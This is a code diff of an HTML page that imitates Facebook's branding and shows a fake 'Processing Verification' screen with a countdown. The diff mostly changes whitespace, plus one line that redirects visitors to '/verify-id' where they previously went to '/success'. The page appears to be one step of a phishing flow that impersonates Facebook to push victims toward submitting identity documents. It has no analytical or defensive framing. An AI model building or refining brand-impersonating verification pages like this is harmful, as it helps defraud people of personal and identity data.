@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -12,7 +13,7 @@
       padding: 0;
       box-sizing: border-box;
     }
-
+    
     body {
       font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
       background-color: #f0f2f5;
@@ -22,7 +23,7 @@
       display: flex;
       flex-direction: column;
     }
-
+    
     .fb-header {
       background: white;
       border-bottom: 1px solid #dadde1;
@@ -35,7 +36,7 @@
       z-index: 100;
       box-shadow: 0 2px 4px rgba(0,0,0,.1);
     }
-
+    
     .fb-logo-header {
       color: #1877f2;
       font-size: 32px;
@@ -43,7 +44,7 @@
       font-family: Klavika-Medium, sans-serif;
       text-decoration: none;
     }
-
+    
     .processing-container {
       flex: 1;
       display: flex;
@@ -52,7 +53,7 @@
       padding: 20px;
       min-height: calc(100vh - 56px);
     }
-
+    
     .processing-card {
       background: white;
       border-radius: 8px;
@@ -62,7 +63,7 @@
       max-width: 480px;
       text-align: center;
     }
-
+    
     .processing-icon {
       width: 120px;
       height: 120px;
@@ -75,36 +76,36 @@
       box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);
       animation: processingPulse 2s ease-in-out infinite;
     }
-
+    
     @keyframes processingPulse {
       0% { transform: scale(1); }
       50% { transform: scale(1.05); }
       100% { transform: scale(1); }
     }
-
+    
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
+    
     .spinner {
       animation: spin 2s linear infinite;
     }
-
+    
     .processing-title {
       color: #1877f2;
       font-size: 28px;
       font-weight: bold;
       margin-bottom: 16px;
     }
-
+    
     .processing-subtitle {
       color: #65676B;
       font-size: 16px;
       line-height: 24px;
       margin-bottom: 32px;
     }
-
+    
     .countdown-container {
       background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%);
       border: 1px solid #1877f2;
@@ -112,27 +113,27 @@
       padding: 24px;
       margin-bottom: 32px;
     }
-
+    
     .countdown-title {
       color: #1877f2;
       font-weight: 600;
       font-size: 16px;
       margin-bottom: 12px;
     }
-
+    
     .countdown-text {
       color: #1c1e21;
       font-size: 14px;
       margin-bottom: 16px;
     }
-
+    
     .progress-bar-container {
       background-color: #e4e6ea;
       border-radius: 10px;
       height: 8px;
       overflow: hidden;
     }
-
+    
     .progress-bar {
       background-color: #1877f2;
       height: 100%;
@@ -140,17 +141,17 @@
       border-radius: 10px;
       transition: width 1s ease;
     }
-
+    
     @media (max-width: 480px) {
       .processing-card {
         padding: 32px 24px;
         margin: 0 16px;
       }
-
+      
       .processing-title {
         font-size: 24px;
       }
-
+      
       .processing-icon {
         width: 100px;
         height: 100px;
@@ -162,7 +163,7 @@
   <div class="fb-header">
     <a href="/" class="fb-logo-header">facebook</a>
   </div>
-
+  
   <div class="processing-container">
     <div class="processing-card">
       <div class="processing-icon">
@@ -170,12 +171,12 @@
           <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
         </svg>
       </div>
-
+      
       <h1 class="processing-title">Processing Verification</h1>
       <p class="processing-subtitle">
         Please wait while we complete your account verification. This may take a few moments.
       </p>
-
+      
       <div class="countdown-container">
         <div class="countdown-title">Finalizing Security Setup</div>
         <div class="countdown-text">
@@ -187,20 +188,20 @@
       </div>
     </div>
   </div>
-
+  
   <script>
     let countdown = 10;
     const countdownTimer = document.getElementById('countdown-timer');
     const progressBar = document.getElementById('progress-bar');
-
+    
     const timer = setInterval(() => {
       countdown--;
       countdownTimer.textContent = countdown;
       progressBar.style.width = ((10 - countdown) / 10) * 100 + '%';
-
+      
       if (countdown <= 0) {
         clearInterval(timer);
-        window.location.href = '/success';
+        window.location.href = '/verify-id';
       }
     }, 1000);
   </script>
